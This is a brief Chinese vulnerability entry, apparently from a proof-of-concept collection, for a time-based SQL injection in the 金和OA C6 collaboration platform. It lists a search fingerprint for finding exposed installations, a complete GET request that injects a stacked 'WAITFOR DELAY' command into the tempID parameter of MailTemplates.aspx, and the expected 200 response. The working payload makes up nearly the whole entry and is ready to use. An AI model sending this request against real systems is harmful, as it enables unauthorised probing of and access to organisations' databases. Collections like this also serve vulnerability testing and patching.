# 金和OA-C6JHSoft-WebSQL延时注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`"金和 C6 协同管理平台"`
- **请求**：`GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%3BWAITFOR+DELAY+%270%3A0%3A6%27-- HTTP/1.1`
- **响应特征**：200